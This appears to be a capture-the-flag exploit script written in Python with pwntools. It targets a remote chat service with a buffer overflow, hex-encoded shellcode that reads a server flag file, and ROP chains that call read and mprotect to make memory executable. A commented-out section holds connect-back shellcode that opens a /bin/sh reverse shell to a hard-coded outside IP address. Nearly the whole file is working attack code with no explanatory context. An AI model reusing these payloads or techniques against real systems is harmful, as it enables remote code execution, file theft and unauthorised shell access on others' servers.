#!/usr/bin/python

from pwn import *
import time


s2 = remote("rcs.eatpwnnosleep.com",13137)
time.sleep(0.5)
s2.recvuntil(">>")

#time.sleep(1)
s2.sendline("2")
time.sleep(0.5)
s2.recvuntil(">>")

pay = "A"*253+"\x00"*2+"AAAA"
s2.send(pay)
#s1.recvuntil("==========Chat Start==========\n")
s2.recvuntil("==========Chat Start==========\n")

shellcode="48c7c70000000048c7c60000000048c7c0710000000f0548b8722f666c616700005048b861745f73657276655048b82f686f6d652f636850545f6a005e6a02580f054889c748c7c61c646d0048c7c2000100004831c00f0548c7c05060400048c7c61c646d0048c7c70500000048c7c20001000048c7c100000000ffd048c7c70500000048c7c030d74400ffd0".decode('hex')

pay = "\x90"*0x100
pay += shellcode
pay += "\x90"*(0x400-len(pay))
s2.send(pay)
time.sleep(1)
pay = "F"*0x7f
pay += p64(0x0405db9) + p64(7)+p64(0x1000)+p64(0x4006e6)+p64(0x6d6000)+p64(0x44f410)+p64(0x6d69a6)

"""
4006e6 : pop rdi ; ret
405749 : pop rdx ; pop rsi ; ret
04058A0 __libc_read

44EF30 mprotect

0x6d7a24
"""
rp = p64(0x4006e6)+p64(0)+p64(0x405749)+p64(0x100)+p64(0x6d7a24)+p64(0x4058a0)
rp +=p64(0x4006e6)+p64(0x6d7000)+p64(0x405749)+p64(7)+p64(0x1000)+p64(0x44EF30)+p64(0x6d7a24)

#pay += "F"*(0x3f0-len(pay)-0x2ed+0xb-8)+rp+"G"*(0x2ed-10-8-0xb-len(rp))+"\n\n\n\n"
pay += "F"*(0x3f0-len(pay))+"\n\n\n\n"#-0x2ed+0xb-8)+"G"*len(rp)+"G"*(0x2ed-10-8-0xb-len(rp))+"\n\n\n\n"
s2.send(pay)
#s1.recvuntil("FFFFFFFFFFFFFFFFFFFFFFFFFFFFF\n")
#print s1.recv(4096)
"""
s3 = process("./chat_client")
s4 = process("./chat_client")
s3.recvuntil(">>")
s4.recvuntil(">>")
s3.sendline("1")
s3.recvuntil(">>")
s3.sendline("ASDF")
s3.recvuntil("wait 10 seconds...")
s4.sendline("2")
s4.recvuntil(">>")
s4.sendline("ASDF")
s3.recvuntil("==========Chat Start==========\n")
s4.recvuntil("==========Chat Start==========\n")

s3.sendline("AAAA")
s4.recvuntil("Remote6: AAAA\x00")
"""

#s2.send("/bye\n")
#s1.send("/bye\n")
#s1.send("TTTT\n")
#s2.recvuntil("TTTT\x00\n")
#s2.sendline("/bye")
time.sleep(0.5)

#s2.sendline("/bye")
#s2.close()

#s1.sendline("/bye")
#s2.interactive()
#s2.interactive()
#s2.send("T"*0x800)
#for i in range(100):
#  s1.sendline(p32(0x0DF0ADDe))

#s2.sendline("\x00\xde\xad\xf0\x0d\x04\x00\x00"*0x100)
s2.send("\xde\xad\xf0\x0d"+"A"*0x3fc)
s2.interactive()
#s1.interactive()
exit()
"""
pay += "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x68\xc7\x44\x24\x04\xcb\xe5\x9b\x7d\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"+"A"*(0x80-118)
s2.send(pay)
time.sleep(1)
pay = "C"*0x80
pay += "\x90"*0x150
s2.send(pay)
time.sleep(1)
pay = "B"*0xb3+p64(0x0405db9) + p64(7)+p64(0x1000)+p64(0x4006e6)+p64(0x6d6000)+p64(0x44f410)+p64(0x6d69a0)
pay += "C"*(413-56-0x9a)
pay += p64(0x0405db9) + p64(7)+p64(0x1000)+p64(0x4006e6)+p64(0x6d6000)+p64(0x44f410)+p64(0x6d69a0)
pay += "D"*(0x99-56)
s2.send(pay)
time.sleep(1)
pay = "\x90"*100+"\xeb\xfe"+"\x90"*0x150
s2.send(pay)
time.sleep(1)
pay = "D"*0x250
s2.send(pay)
#pay += p64(0x0405db9) + p64(7)+p64(0x1000)+p64(0x4006e6)+p64(0x6d6000)+p64(0x44f410)+p64(0x6d69a0)
"""
#s2.send("\x90"*(255+0x80))
#s2.send("\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x68\xc7\x44\x24\x04\xcb\xe5\x9b\x7d\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"+"A"*(0x80-118))
#s2.send("A"*(0x80))

#s1.send("\x90"*0x80)
#print s2.recv(1024)
#print s1.recv(1024)

#s2.send("\x90"*0x250)

"""
0405db9 : pop rdx ; pop rsi ; ret
4006e6 : pop rdi ; ret
0x44f410 : mprotect
"""
time.sleep(1)

#s2.interactive()
s2.close()
